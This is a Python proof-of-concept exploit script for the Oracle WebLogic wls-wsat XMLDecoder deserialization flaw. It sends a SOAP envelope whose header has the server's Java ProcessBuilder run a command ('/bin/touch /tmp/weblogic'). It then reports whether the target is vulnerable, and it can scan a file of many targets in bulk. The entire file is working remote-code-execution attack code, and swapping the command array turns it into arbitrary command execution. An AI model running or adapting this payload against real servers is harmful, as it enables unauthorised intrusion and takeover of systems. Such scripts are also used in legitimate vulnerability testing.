import requests
import re
from sys import argv

heads = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
    'Content-Type': 'text/xml;charset=UTF-8'
    }

def poc(url):
    if not url.startswith("http"):
        url = "http://" + url
    if "/" in url:
        url += '/wls-wsat/CoordinatorPortType'
    post_str = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java>
            <void class="java.lang.ProcessBuilder">
              <array class="java.lang.String" length="2">
                <void index="0">
                  <string>/bin/touch</string>
                </void>
                <void index="1">
                  <string>/tmp/weblogic</string>
                </void>
              </array>
              <void method="start"/>
            </void>
          </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>
    '''

    try:
        response = requests.post(url, data=post_str, verify=False, timeout=5, headers=heads)
        response = response.text
        response = re.search(r"\<faultstring\>.*\<\/faultstring\>", response).group(0)
    except Exception as e:
        response = ""

    if '<faultstring>java.lang.ProcessBuilder' in response or "<faultstring>0" in response:
        result = "Vulnerability"
        return result
    else:
        result = "No Vulnerability"
        return result


if __name__ == '__main__':
    if len(argv) == 1:
        print("python this_poc_name.py(or .exe) url:port \npython this_poc_name.py(or .exe) -f task_file.txt")
        #print("单个检测:weblogic_poc.exe url:port \n批量检测:weblogic_poc.exe -f 任务列表.txt")
        exit(0)
    elif argv[1] == "-f":
        with open(argv[2], 'r') as file:
            for each in file.readlines():
                each = each.strip()
                result = poc(each)
                print(each + " -- " + result)
    else:
        url = argv[1]
        result = poc(url)
        print(result)